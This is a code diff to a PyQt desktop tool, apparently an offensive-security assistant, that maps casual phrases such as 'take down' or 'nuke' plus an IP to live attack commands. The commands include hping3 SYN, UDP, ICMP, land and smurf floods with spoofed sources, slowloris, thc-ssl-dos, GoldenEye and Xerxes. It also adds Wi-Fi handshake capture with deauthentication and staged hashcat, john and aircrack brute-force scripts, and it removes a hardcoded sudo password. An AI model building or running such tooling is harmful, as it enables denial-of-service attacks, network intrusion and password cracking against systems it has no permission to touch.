@@ -148,11 +148,6 @@ class MaximWindow(QMainWindow):
         QTimer.singleShot(0, self._update_status)
 
     def _ask_sudo_password(self):
-        # Auto-set sudo password
-        self.runner.set_sudo_password("5505")
-        self.terminal.appendPlainText("[OK] Sudo password set.\n")
-        return
-        # Fallback dialog (kept but unreachable)
         pwd, ok = QInputDialog.getText(
             self, "Sudo Password",
             "Enter your sudo password (needed to run privileged commands):",
@@ -548,7 +543,8 @@ class MaximWindow(QMainWindow):
             "bettercap", "responder", "searchsploit", "msfvenom",
             "enum4linux", "smbclient", "crackmapexec", "gobuster",
             "masscan ", "netdiscover", "tor ", "proxychains",
-            "ufonet", "hping3 ", "slowloris",
+            "ufonet", "hping3 ", "slowloris", "goldeneye ", "xerxes ",
+            "thc-ssl-dos ",
             "ssh ", "socat ", "chisel ", "cat ", "grep ",
             "ls ", "cd ", "apt ", "apt-get ", "systemctl ",
             "service ", "chmod ", "chown ", "mkdir ", "rm ", "cp ", "mv ",
@@ -562,27 +558,104 @@ class MaximWindow(QMainWindow):
             if dm and dm.group(1) not in ('of', 'the'):
                 target_ip = dm.group(1)
 
+        # Extract port if specified (e.g. "syn flood 192.168.1.1 port 443")
+        port_match = re.search(r'(?:port|:)\s*(\d{1,5})', q_lower)
+        target_port = port_match.group(1) if port_match else None
+
         if target_ip:
+            # ── Ping attacks ──
             if re.search(r'ping\s+(of\s+)?death', q_lower):
                 self._execute_command(f"sudo ping -s 65500 -c 100 {target_ip}")
                 return
             if re.search(r'ping\s+flood', q_lower):
                 self._execute_command(f"sudo ping -f -s 65500 {target_ip}")
                 return
-            if re.search(r'syn\s+flood', q_lower):
-                self._execute_command(f"sudo hping3 -S --flood -V -p 80 {target_ip}")
+
+            # ── SYN flood ──
+            if re.search(r'syn\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*syn', q_lower):
+                port = target_port or "80"
+                if re.search(r'rand(om)?\s*source|spoof\s*source', q_lower):
+                    self._execute_command(f"sudo hping3 -S --flood --rand-source -V -p {port} {target_ip}")
+                else:
+                    self._execute_command(f"sudo hping3 -S --flood -V -p {port} {target_ip}")
                 return
-            if re.search(r'(http|slowloris)\s+(flood|attack|dos)', q_lower) or re.search(r'(flood|attack|dos)\s+(http|slowloris)', q_lower):
-                self._execute_command(f"slowloris {target_ip} -p 80 -s 500")
+
+            # ── UDP flood ──
+            if re.search(r'udp\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*udp', q_lower):
+                port = target_port or "53"
+                self._execute_command(f"sudo hping3 --udp --flood -p {port} {target_ip}")
                 return
-            if re.search(r'udp\s+flood', q_lower):
-                self._execute_command(f"sudo hping3 --udp --flood -p 53 {target_ip}")
-                return
-            if re.search(r'icmp\s+flood', q_lower):
+
+            # ── ICMP flood ──
+            if re.search(r'icmp\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*icmp', q_lower):
                 self._execute_command(f"sudo hping3 --icmp --flood {target_ip}")
                 return
-            if re.search(r'ufonet\s+(attack|launch|ddos)', q_lower):
+
+            # ── HTTP / Slowloris ──
+            if re.search(r'slowloris', q_lower):
+                port = target_port or "80"
+                sockets = "500"
+                if re.search(r'https|ssl|tls|443', q_lower):
+                    self._execute_command(f"slowloris {target_ip} -p 443 -s {sockets} --https")
+                else:
+                    self._execute_command(f"slowloris {target_ip} -p {port} -s {sockets}")
+                return
+            if re.search(r'http\s*(flood|attack|dos|ddos)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*http', q_lower):
+                port = target_port or "80"
+                self._execute_command(f"slowloris {target_ip} -p {port} -s 500")
+                return
+
+            # ── SSL / TLS DoS ──
+            if re.search(r'(ssl|tls|https)\s*(flood|attack|dos|ddos|renegotiat)', q_lower) or re.search(r'(flood|attack|dos|ddos)\s*(ssl|tls|https)', q_lower):
+                port = target_port or "443"
+                self._execute_command(f"thc-ssl-dos {target_ip} {port} --accept")
+                return
+
+            # ── Christmas tree / XMAS attack ──
+            if re.search(r'(christmas|xmas)\s*(tree|attack|flood|packet)', q_lower) or re.search(r'(attack|flood)\s*(christmas|xmas)', q_lower):
+                port = target_port or "80"
+                self._execute_command(f"sudo hping3 --flood -FSRPAU -p {port} {target_ip}")
+                return
+
+            # ── Land attack ──
+            if re.search(r'land\s*attack', q_lower):
+                port = target_port or "80"
+                self._execute_command(f"sudo hping3 -S -a {target_ip} -p {port} --flood {target_ip}")
+                return
+
+            # ── Smurf attack ──
+            if re.search(r'smurf\s*(attack|flood)?', q_lower):
+                self._execute_command(f"sudo hping3 --icmp --flood -a {target_ip} 255.255.255.255")
+                return
+
+            # ── GoldenEye HTTP flood ──
+            if re.search(r'goldeneye', q_lower):
+                self._execute_command(f"goldeneye http://{target_ip} -w 50 -s 500")
+                return
+
+            # ── Xerxes ──
+            if re.search(r'xerxes', q_lower):
+                port = target_port or "80"
+                self._execute_command(f"xerxes {target_ip} {port}")
+                return
+
+            # ── UFONet ──
+            if re.search(r'ufonet', q_lower):
                 self._execute_command(f"ufonet -a {target_ip} -r 500 --threads 200")
+                return
+
+            # ── Generic "dos/ddos/stress/flood/attack" — pick best method ──
+            if re.search(r'\b(dos|ddos|stress\s*test|flood|overload|take\s*down|bring\s*down|attack|crash|overwhelm|bomb|nuke|destroy|kill\s*server|hammer|blast|wreck)\b', q_lower):
+                port = target_port or "80"
+                # If they mention web/website/server — use slowloris
+                if re.search(r'\b(web|website|site|server|apache|nginx|http)\b', q_lower):
+                    self._execute_command(f"slowloris {target_ip} -p {port} -s 500")
+                # If they mention wifi/network layer — ICMP
+                elif re.search(r'\b(wifi|network|router|gateway)\b', q_lower):
+                    self._execute_command(f"sudo hping3 --icmp --flood {target_ip}")
+                # Default: SYN flood (most effective general purpose)
+                else:
+                    self._execute_command(f"sudo hping3 -S --flood -V -p {port} {target_ip}")
                 return
 
         # 3. Raw command (starts with a known tool binary)
@@ -899,9 +972,11 @@ class MaximWindow(QMainWindow):
 
         self.terminal.appendPlainText(f"\n[3/5] Found: BSSID={bssid}  Channel={channel}\n")
 
-        # Write capture + deauth script
+        # Write capture + deauth script — subfolder per ESSID
         safe_essid = essid.replace(' ', '_').replace("'", "").replace('"', '')
-        capture_prefix = f"{out_dir}/{safe_essid}"
+        essid_dir = f"{out_dir}/{safe_essid}"
+        os.makedirs(essid_dir, exist_ok=True)
+        capture_prefix = f"{essid_dir}/{safe_essid}"
 
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
@@ -909,7 +984,7 @@ class MaximWindow(QMainWindow):
         script.write(f"echo '══════════════════════════════════════════'\n")
         script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
         script.write(f"echo '  BSSID: {bssid}  Channel: {channel}'\n")
-        script.write(f"echo '  Output: {out_dir}/'\n")
+        script.write(f"echo '  Output: {essid_dir}/'\n")
         script.write(f"echo '══════════════════════════════════════════'\n")
         script.write(f"echo ''\n")
         script.write(f"echo '[*] Starting capture + deauth...'\n")
@@ -929,13 +1004,13 @@ class MaximWindow(QMainWindow):
         script.write(f"kill $DEAUTH_PID 2>/dev/null\n")
         script.write(f"echo ''\n")
         script.write(f"echo 'Capture files:'\n")
-        script.write(f"ls -la {capture_prefix}* 2>/dev/null\n")
+        script.write(f"ls -la {essid_dir}/ 2>/dev/null\n")
         script.write(f"echo ''\necho 'Press Enter to close'\nread\n")
         script.close()
         os.chmod(script.name, 0o755)
 
         self.terminal.appendPlainText(f"[4/5] Opening capture terminal...\n")
-        self.terminal.appendPlainText(f"[5/5] Capture files → {out_dir}/\n\n")
+        self.terminal.appendPlainText(f"[5/5] Capture files → {essid_dir}/\n\n")
 
         self.runner.run_in_terminal(f"bash '{script.name}'")
 
@@ -947,6 +1022,7 @@ class MaximWindow(QMainWindow):
         "nmap", "masscan", "netdiscover", "airmon-ng", "airodump-ng",
         "aireplay-ng", "aircrack-ng", "wifite", "reaver", "bettercap",
         "ettercap", "tcpdump", "macchanger", "responder", "arp-scan",
+        "hping3",
     }
 
     def _execute_command(self, cmd, as_root=False):
@@ -1000,9 +1076,30 @@ class MaximWindow(QMainWindow):
         )
         self.current_thread.start()
 
+    # Patterns that indicate a progress/status line (should overwrite previous)
+    _PROGRESS_RE = re.compile(
+        r'(?:Speed[.#]|Progress[.=]|Recovered[.]|Status[.]|Session[.]|'
+        r'Guess\.|Time\.|ETA[.:]|Hash\.|candidates|'  # hashcat status lines
+        r'guesses:\s*\d|Testing:|p/s$|c/s$|C/s$|g/s$|'  # john progress
+        r'\d+[kKmMgG]?/s\b|'  # any speed indicator
+        r'^\s*\d+\.\d+%)'  # percentage
+    )
+
     def _on_output_line(self, line):
-        self.terminal.moveCursor(QTextCursor.End)
-        self.terminal.insertPlainText(line)
+        is_progress = bool(self._PROGRESS_RE.search(line))
+
+        if is_progress and getattr(self, '_last_was_progress', False):
+            # Overwrite the last line (simulate \r behavior)
+            cursor = self.terminal.textCursor()
+            cursor.movePosition(QTextCursor.End)
+            cursor.movePosition(QTextCursor.StartOfBlock, QTextCursor.KeepAnchor)
+            cursor.removeSelectedText()
+            cursor.insertText(line.rstrip('\n'))
+        else:
+            self.terminal.moveCursor(QTextCursor.End)
+            self.terminal.insertPlainText(line)
+
+        self._last_was_progress = is_progress
         scrollbar = self.terminal.verticalScrollBar()
         scrollbar.setValue(scrollbar.maximum())
 
@@ -1019,31 +1116,25 @@ class MaximWindow(QMainWindow):
         self.cmd_count_label.setText(f"{len(self.session.commands)} commands")
 
         # If cracking finished with no password found, offer brute force
-        is_crack_cmd = any(t in cmd for t in ["john ", "hashcat ", "aircrack-ng "])
+        is_crack_cmd = any(t in cmd for t in ["john ", "hashcat ", "aircrack-ng ", "maxim_crack_"])
         if is_crack_cmd and not getattr(self, '_is_bruteforcing', False):
             # Check if password was actually cracked in the output
-            text = self.terminal.toPlainText()[-1000:]
+            text = self.terminal.toPlainText()[-2000:]
             found = (
-                re.search(r'KEY FOUND!\s*\[', text) or
-                re.search(r'\d+ password hash(?:es)? cracked', text) or
-                re.search(r'^\?:.+', text, re.MULTILINE)
+                re.search(r'KEY FOUND!\s*\[', text) or                    # aircrack
+                re.search(r'PASSWORD FOUND', text) or                      # our scripts
+                re.search(r'PASSWORD CRACKED', text) or                    # our scripts
+                re.search(r'[1-9]\d* password hash(?:es)? cracked', text) or  # john (exclude "0 password")
+                re.search(r'Recovered\.+:\s*[1-9]', text) or              # hashcat
+                re.search(r'Status\.+:\s*Cracked', text) or               # hashcat
+                re.search(r'^\?:.+', text, re.MULTILINE)                   # john --show
             )
             if not found:
                 self._offer_brute_force(cmd)
 
     def _offer_brute_force(self, original_cmd):
-        """No password found — ask user if they want to brute force."""
-        reply = QMessageBox.question(self, "No Password Found",
-            "Wordlists didn't crack it.\n\nDo you want to BRUTE FORCE it?\n\n"
-            "Stage 1: Digits (0-9) up to 12 chars — 2 min\n"
-            "Stage 2: Lowercase (a-z) up to 8 chars — 3 min\n"
-            "Stage 3: Letters (a-zA-Z) up to 7 chars — 3 min\n"
-            "Stage 4: Alphanumeric up to 6 chars — 5 min\n"
-            "Stage 5: ALL printable up to 5 chars — 5 min\n\n"
-            "Stops early if password is found.",
-            QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
-        if reply != QMessageBox.Yes:
-            return
+        """No password found — offer brute force. Detects tool type and uses fastest method."""
+        import tempfile
 
         # Extract the file path from the original command
         m = re.search(r"'([^']+)'", original_cmd)
@@ -1054,31 +1145,151 @@ class MaximWindow(QMainWindow):
             return
         filepath = m.group(1)
 
-        # Detect john format from original command
-        fmt_match = re.search(r'--format=(\S+)', original_cmd)
-        john_fmt = fmt_match.group(1) if fmt_match else None
+        # Detect what type of crack this is
+        is_aircrack = "aircrack-ng" in original_cmd
+        is_hashcat = "hashcat" in original_cmd
+        is_john = "john" in original_cmd and not is_aircrack
+
+        # Detect formats from original command
+        john_fmt_match = re.search(r'--format=(\S+)', original_cmd)
+        john_fmt = john_fmt_match.group(1) if john_fmt_match else None
+        hashcat_mode_match = re.search(r'-m\s+(\d+)', original_cmd)
+        hashcat_mode = hashcat_mode_match.group(1) if hashcat_mode_match else None
+
+        # WiFi .cap files — use aircrack-ng brute force via crunch pipe
+        if is_aircrack:
+            reply = QMessageBox.question(self, "No Password Found",
+                "Wordlists didn't crack the WiFi handshake.\n\n"
+                "Do you want to BRUTE FORCE it?\n\n"
+                "Stage 1: 8-digit numbers (00000000-99999999) — common WiFi passwords\n"
+                "Stage 2: 8-char lowercase (aaaaaaaa-zzzzzzzz)\n"
+                "Stage 3: 9-10 digit numbers\n"
+                "Stage 4: 8-char alphanumeric\n\n"
+                "WPA passwords are 8-63 characters.\n"
+                "Stops early if password is found.",
+                QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
+            if reply != QMessageBox.Yes:
+                return
+
+            self._is_bruteforcing = True
+            self.terminal.appendPlainText("\n\n  BRUTE FORCING WPA HANDSHAKE...\n\n")
+
+            script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_brute_')
+            script.write("#!/bin/bash\n\n")
+
+            # Each stage: crunch generates passwords, pipes to aircrack
+            stages = [
+                ("Stage 1: 8-digit numbers (most common WiFi passwords)",
+                 f"crunch 8 8 0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                ("Stage 2: 8-char lowercase letters",
+                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                ("Stage 3: 9-digit numbers",
+                 f"crunch 9 9 0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                ("Stage 4: 10-digit numbers (phone numbers)",
+                 f"crunch 10 10 0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+                ("Stage 5: 8-char alphanumeric",
+                 f"crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 | sudo aircrack-ng -w - -b auto '{filepath}'"),
+            ]
+
+            for label, stage_cmd in stages:
+                script.write(f"\necho ''\necho '══════════════════════════════════════'\n")
+                script.write(f"echo '  {label}'\necho '══════════════════════════════════════'\n")
+                script.write(f"{stage_cmd}\n")
+                script.write(f"if [ $? -eq 0 ]; then\n  echo ''\n  echo '  KEY FOUND! Check output above.'\n  exit 0\nfi\n")
+
+            script.write(f"\necho ''\necho '  Brute force complete — no password found in tested ranges.'\n")
+            script.close()
+            os.chmod(script.name, 0o755)
+            self._execute_command(f"bash '{script.name}'")
+            return
+
+        # Hashcat brute force — FASTEST (GPU-accelerated mask attack)
+        if is_hashcat and hashcat_mode:
+            reply = QMessageBox.question(self, "No Password Found",
+                "Wordlists didn't crack it.\n\n"
+                "Do you want to BRUTE FORCE with hashcat (GPU)?\n\n"
+                "Stage 1: Digits 1-12 chars (?d) — very fast\n"
+                "Stage 2: Lowercase 1-8 chars (?l) — fast\n"
+                "Stage 3: Lowercase + digits 1-7 chars — medium\n"
+                "Stage 4: All printable 1-6 chars (?a) — slower\n"
+                "Stage 5: Common patterns (word+digits, etc.)\n\n"
+                "Uses GPU — much faster than CPU.\n"
+                "Stops early if password is found.",
+                QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
+            if reply != QMessageBox.Yes:
+                return
+
+            self._is_bruteforcing = True
+            self.terminal.appendPlainText("\n\n  HASHCAT GPU BRUTE FORCE...\n\n")
+            hm = hashcat_mode
+            check = f"hashcat -m {hm} '{filepath}' --show 2>/dev/null | grep ':'"
+
+            script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_brute_')
+            script.write("#!/bin/bash\n\n")
+
+            # Hashcat mask attack stages — ?d=digit ?l=lower ?u=upper ?a=all printable
+            stages = [
+                # Digits — extremely fast
+                ("Stage 1: Digits 1-4 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?d?d?d?d' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 2>/dev/null"),
+                ("Stage 1b: Digits 5-8 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?d?d?d?d?d?d?d?d' --increment --increment-min=5 --force -O -w 3 --status --status-timer=3 2>/dev/null"),
+                ("Stage 1c: Digits 9-12 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?d?d?d?d?d?d?d?d?d?d?d?d' --increment --increment-min=9 --force -O -w 3 --status --status-timer=3 --runtime=180 2>/dev/null"),
+                # Lowercase — fast
+                ("Stage 2: Lowercase 1-6 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?l?l?l?l?l?l' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 2>/dev/null"),
+                ("Stage 2b: Lowercase 7-8 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?l?l?l?l?l?l?l?l' --increment --increment-min=7 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
+                # Mixed lowercase + digits
+                ("Stage 3: Lowercase+digits 1-6 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' -1 '?l?d' '?1?1?1?1?1?1' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
+                # Common patterns: word + 1-4 digits at end
+                ("Stage 4: Common patterns (lowercase + trailing digits)",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?l?l?l?l?l?d?d?d?d' --increment --increment-min=5 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
+                # All printable
+                ("Stage 5: All printable 1-5 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?a?a?a?a?a' --increment --increment-min=1 --force -O -w 3 --status --status-timer=3 --runtime=300 2>/dev/null"),
+                ("Stage 5b: All printable 6 chars",
+                 f"hashcat -m {hm} -a 3 '{filepath}' '?a?a?a?a?a?a' --force -O -w 3 --status --status-timer=3 --runtime=600 2>/dev/null"),
+            ]
+
+            for label, stage_cmd in stages:
+                script.write(f"\necho ''\necho '══════════════════════════════════════'\n")
+                script.write(f"echo '  {label}'\necho '══════════════════════════════════════'\n")
+                script.write(f"{stage_cmd}\n")
+                script.write(f"if {check} >/dev/null 2>&1; then\n")
+                script.write(f"  echo ''\n  echo '  PASSWORD CRACKED!'\n")
+                script.write(f"  hashcat -m {hm} '{filepath}' --show 2>/dev/null\n")
+                script.write(f"  exit 0\nfi\n")
+
+            script.write(f"\necho ''\necho '  Brute force complete.'\n")
+            script.write(f"hashcat -m {hm} '{filepath}' --show 2>/dev/null\n")
+            script.close()
+            os.chmod(script.name, 0o755)
+            self._execute_command(f"bash '{script.name}'")
+            return
+
+        # John the Ripper brute force — CPU, works for everything
+        reply = QMessageBox.question(self, "No Password Found",
+            "Wordlists didn't crack it.\n\n"
+            "Do you want to BRUTE FORCE it?\n\n"
+            "Stage 1: Digits (0-9) up to 12 chars — fast\n"
+            "Stage 2: Lowercase (a-z) up to 8 chars\n"
+            "Stage 3: Letters (a-zA-Z) up to 7 chars\n"
+            "Stage 4: Alphanumeric up to 6 chars\n"
+            "Stage 5: ALL printable up to 6 chars\n\n"
+            "Stops early if password is found.",
+            QMessageBox.Yes | QMessageBox.No, QMessageBox.Yes)
+        if reply != QMessageBox.Yes:
+            return
+
         fmt_flag = f"--format={john_fmt} " if john_fmt else ""
 
         self._is_bruteforcing = True
-        self.terminal.appendPlainText("\n\n  BRUTEFORCING NOW...\n\n")
+        self.terminal.appendPlainText("\n\n  JOHN BRUTE FORCE...\n\n")
 
-        # John the Ripper staged brute force using --incremental modes
-        # John's Incremental mode is its optimized brute force engine.
-        # It uses Markov chains to try most likely passwords first.
-        #
-        # Built-in incremental modes (defined in john.conf):
-        #   Digits   — 0-9 only
-        #   Lower    — a-z only
-        #   Alpha    — a-zA-Z
-        #   Alnum    — a-zA-Z0-9
-        #   ASCII    — all printable ASCII (95 chars)
-        #
-        # --max-run-time=N  stops after N seconds (prevents running forever)
-        # --max-length=N    limits password length to try
-        #
-        # After each stage, check if cracked. If yes, stop early.
-
-        check = f"john {fmt_flag}--show '{filepath}' 2>/dev/null | grep -c ':'"
+        check = f"john {fmt_flag}--show '{filepath}' 2>/dev/null | grep -v '^0 password' | grep -v '^$' | grep ':'"
 
         stages = [
             ("Stage 1: Digits only (0-9), up to 12 chars, 2 min",
@@ -1089,28 +1300,24 @@ class MaximWindow(QMainWindow):
              f"john {fmt_flag}--incremental=Alpha --max-length=7 --max-run-time=180 '{filepath}'"),
             ("Stage 4: Alphanumeric (a-zA-Z0-9), up to 6 chars, 5 min",
              f"john {fmt_flag}--incremental=Alnum --max-length=6 --max-run-time=300 '{filepath}'"),
-            ("Stage 5: ALL printable chars, up to 5 chars, 5 min",
-             f"john {fmt_flag}--incremental=ASCII --max-length=5 --max-run-time=300 '{filepath}'"),
+            ("Stage 5: ALL printable chars, up to 6 chars, 5 min",
+             f"john {fmt_flag}--incremental=ASCII --max-length=6 --max-run-time=300 '{filepath}'"),
         ]
 
-        # Write brute force stages to a temp script for clean execution
-        import tempfile
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_brute_')
         script.write("#!/bin/bash\n")
         for label, stage_cmd in stages:
-            script.write(f"\necho ''\necho '--- {label} ---'\n")
+            script.write(f"\necho ''\necho '══════════════════════════════════════'\n")
+            script.write(f"echo '  {label}'\necho '══════════════════════════════════════'\n")
             script.write(f"{stage_cmd}\n")
-            script.write(f"FOUND=$({check})\n")
-            script.write(f"if [ \"$FOUND\" -gt 0 ] 2>/dev/null; then\n")
-            script.write(f"  echo ''\n  echo 'PASSWORD CRACKED!'\n")
+            script.write(f"if {check} >/dev/null 2>&1; then\n")
+            script.write(f"  echo ''\n  echo '  PASSWORD CRACKED!'\n")
             script.write(f"  john {fmt_flag}--show '{filepath}'\n")
             script.write(f"  exit 0\nfi\n")
-        script.write(f"\necho ''\necho '--- Brute Force Complete ---'\n")
+        script.write(f"\necho ''\necho '  Brute force complete.'\n")
         script.write(f"john {fmt_flag}--show '{filepath}'\n")
         script.close()
-        import stat
-        os.chmod(script.name, os.stat(script.name).st_mode | stat.S_IEXEC)
-
+        os.chmod(script.name, 0o755)
         self._execute_command(f"bash '{script.name}'")
 
     def _on_file_dropped(self, filepath):
@@ -1159,7 +1366,8 @@ class MaximWindow(QMainWindow):
         return existing if existing else ["/usr/share/wordlists/gago.txt"]
 
     def _build_crack_cmd(self, tool, filepath, hash_format=None):
-        """Build crack command: rockyou.txt first, then all other wordlists if no result."""
+        """Build crack command as a bash script with early exit on success."""
+        import tempfile
         wordlists = self._get_wordlists()
         # Ensure gago.txt is first, rockyou second
         for main_wl in reversed(["/usr/share/wordlists/gago.txt", "/usr/share/wordlists/rockyou.txt"]):
@@ -1168,32 +1376,87 @@ class MaximWindow(QMainWindow):
                 wordlists.insert(0, main_wl)
 
         if tool == "aircrack":
-            # aircrack-ng accepts comma-separated wordlists
             combined = ",".join(wordlists)
             return f"sudo aircrack-ng -w '{combined}' '{filepath}'"
 
-        elif tool == "john":
-            # Stage 1: rockyou.txt with rules
+        # Build a script that stops as soon as password is found
+        script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_crack_')
+        script.write("#!/bin/bash\n")
+        script.write("set -e\n\n")
+
+        if tool == "john":
             fmt = f"--format={hash_format} " if hash_format else ""
-            cmds = [f"john {fmt}--wordlist='{wordlists[0]}' --rules=best64 '{filepath}'"]
-            # Stage 2: all other wordlists (if rockyou didn't crack it)
-            for wl in wordlists[1:]:
-                cmds.append(f"john {fmt}--wordlist='{wl}' '{filepath}'")
-            # Show results
-            cmds.append(f"john {fmt}--show '{filepath}'")
-            return " ; ".join(cmds)
+            check = f"john {fmt}--show '{filepath}' 2>/dev/null | grep -v '^0 password' | grep -v '^$' | grep ':'"
+
+            # Stage 1: first wordlist + rules
+            script.write(f"echo ''\necho '  [1] Wordlist + rules: {os.path.basename(wordlists[0])}'\n")
+            script.write(f"john {fmt}--wordlist='{wordlists[0]}' --rules=best64 '{filepath}'\n")
+            script.write(f"if {check} >/dev/null 2>&1; then\n")
+            script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  john {fmt}--show '{filepath}'\n  exit 0\nfi\n")
+
+            # Stage 2+: remaining wordlists
+            for i, wl in enumerate(wordlists[1:], 2):
+                script.write(f"\necho ''\necho '  [{i}] Wordlist: {os.path.basename(wl)}'\n")
+                script.write(f"john {fmt}--wordlist='{wl}' '{filepath}'\n")
+                script.write(f"if {check} >/dev/null 2>&1; then\n")
+                script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  john {fmt}--show '{filepath}'\n  exit 0\nfi\n")
+
+            # Final show
+            script.write(f"\necho ''\necho '  Wordlists exhausted.'\njohn {fmt}--show '{filepath}'\n")
 
         elif tool == "hashcat":
-            cmds = []
-            # Stage 1: rockyou.txt with rules
-            cmds.append(f"hashcat -m {hash_format} '{filepath}' '{wordlists[0]}' -r /usr/share/hashcat/rules/best64.rule --force 2>/dev/null")
-            # Stage 2: all other wordlists
-            for wl in wordlists[1:]:
-                cmds.append(f"hashcat -m {hash_format} '{filepath}' '{wl}' --force 2>/dev/null")
-            cmds.append(f"hashcat -m {hash_format} '{filepath}' --show 2>/dev/null")
-            return " ; ".join(cmds)
+            hm = hash_format
+            check = f"hashcat -m {hm} '{filepath}' --show 2>/dev/null | grep ':'"
 
-        return ""
+            # Stage 1: first wordlist + rules
+            script.write(f"echo ''\necho '  [1] Wordlist + rules: {os.path.basename(wordlists[0])}'\n")
+            script.write(f"hashcat -m {hm} '{filepath}' '{wordlists[0]}' -r /usr/share/hashcat/rules/best64.rule --force -O --status --status-timer=3 2>/dev/null\n")
+            script.write(f"if {check} >/dev/null 2>&1; then\n")
+            script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  hashcat -m {hm} '{filepath}' --show 2>/dev/null\n  exit 0\nfi\n")
+
+            # Stage 2+: remaining wordlists
+            for i, wl in enumerate(wordlists[1:], 2):
+                script.write(f"\necho ''\necho '  [{i}] Wordlist: {os.path.basename(wl)}'\n")
+                script.write(f"hashcat -m {hm} '{filepath}' '{wl}' --force -O --status --status-timer=3 2>/dev/null\n")
+                script.write(f"if {check} >/dev/null 2>&1; then\n")
+                script.write(f"  echo ''\n  echo '  PASSWORD FOUND!'\n  hashcat -m {hm} '{filepath}' --show 2>/dev/null\n  exit 0\nfi\n")
+
+            # Final show
+            script.write(f"\necho ''\necho '  Wordlists exhausted.'\nhashcat -m {hm} '{filepath}' --show 2>/dev/null\n")
+
+        script.close()
+        os.chmod(script.name, 0o755)
+        return f"bash '{script.name}'"
+
+    # Hash detection: (prefix, john_format, hashcat_mode, label, tool_preference)
+    # tool_preference: "hashcat" = GPU-fast hashes, "john" = CPU-better or complex formats
+    HASH_TYPES = [
+        # Prefix-based detection (checked first)
+        ("$2b$", "bcrypt", "3200", "bcrypt", "hashcat"),
+        ("$2a$", "bcrypt", "3200", "bcrypt", "hashcat"),
+        ("$2y$", "bcrypt", "3200", "bcrypt", "hashcat"),
+        ("$2$",  "bcrypt", "3200", "bcrypt", "hashcat"),
+        ("$6$",  "sha512crypt", "1800", "SHA512crypt", "hashcat"),
+        ("$5$",  "sha256crypt", "7400", "SHA256crypt", "hashcat"),
+        ("$1$",  "md5crypt", "500", "MD5crypt", "hashcat"),
+        ("$apr1$", "md5crypt", "1600", "Apache MD5", "hashcat"),
+        ("$P$",  "phpass", "400", "phpass (WordPress)", "hashcat"),
+        ("$H$",  "phpass", "400", "phpass (phpBB)", "hashcat"),
+        ("$y$",  "yescrypt", "None", "yescrypt", "john"),
+        ("$7$",  "scrypt", "None", "scrypt", "john"),
+    ]
+
+    # Length-based detection: (hash_length, john_format, hashcat_mode, label)
+    HASH_LENGTHS = {
+        32:  ("Raw-MD5", "0", "MD5"),
+        40:  ("Raw-SHA1", "100", "SHA1"),
+        56:  ("Raw-SHA224", "1300", "SHA224"),
+        64:  ("Raw-SHA256", "1400", "SHA256"),
+        96:  ("Raw-SHA384", "10800", "SHA384"),
+        128: ("Raw-SHA512", "1700", "SHA512"),
+        16:  ("LM", "3000", "LM hash"),
+        32 + 1 + 32: ("NTLM", "1000", "NTLM"),  # 65 chars for user:hash
+    }
 
     def _analyze_file(self, filepath):
         """Auto-detect file type and crack/analyze immediately — no popups."""
@@ -1202,7 +1465,6 @@ class MaximWindow(QMainWindow):
         fname = os.path.basename(filepath)
 
         if ext in ('.cap', '.pcap'):
-            # WiFi capture — auto crack with all wordlists
             wls = self._get_wordlists()
             self.terminal.appendPlainText(f"\n⚡ Cracking WPA from {fname} using {len(wls)} wordlists:\n")
             for wl in wls:
@@ -1211,14 +1473,11 @@ class MaximWindow(QMainWindow):
             self._execute_command(self._build_crack_cmd("aircrack", filepath))
 
         elif ext in ('.hc22000', '.hccapx'):
-            # Hashcat WiFi format — multi wordlist + rules + brute force
             wl_count = len(self._get_wordlists())
-            self.terminal.appendPlainText(f"\n⚡ Cracking {fname} with hashcat ({wl_count} wordlists + rules + brute force)...\n")
+            self.terminal.appendPlainText(f"\n⚡ Cracking {fname} with hashcat ({wl_count} wordlists + rules)...\n")
             self._execute_command(self._build_crack_cmd("hashcat", filepath, "22000"))
 
         elif ext in ('.txt', '.hash'):
-            # Hash file — auto-detect hash type and crack
-            # Read first line to detect type
             self.terminal.appendPlainText(f"\n⚡ Auto-detecting hash type in {fname}...\n")
             try:
                 with open(filepath, 'r') as f:
@@ -1230,46 +1489,42 @@ class MaximWindow(QMainWindow):
                 self.terminal.appendPlainText("[!] Empty file\n")
                 return
 
-            hash_len = len(first_line.split(':')[0]) if ':' in first_line else len(first_line)
-
-            # Auto-detect by hash length
             wl_count = len(self._get_wordlists())
 
